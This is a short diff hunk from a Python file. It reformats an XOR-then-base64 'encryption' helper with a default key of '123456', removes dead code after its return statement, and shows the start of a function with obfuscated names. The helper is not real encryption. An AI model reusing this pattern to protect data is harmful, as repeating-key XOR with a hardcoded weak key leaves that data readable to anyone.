@@ -266,13 +266,10 @@ async def decrypt_file(file_path, key):
 
 async def xor_encrypt_to_base64(input_str, key="123456"):
     key_len = len(key)
-    encrypted_bytes = [
-        ord(char) ^ ord(key[i % key_len]) for i, char in enumerate(input_str)
-    ]
+    encrypted_bytes = [ord(char) ^ ord(key[i % key_len]) for i, char in enumerate(input_str)]
     base64_encrypted = base64.b64encode(bytes(encrypted_bytes))
     return base64_encrypted.decode('utf-8')
-    success = decrypt_file(key)
-    print("Decryption successful:", success)
+
 async def _A7(_Q, _W):
     _R = "r_"  
     if not _X1.exists(_R):
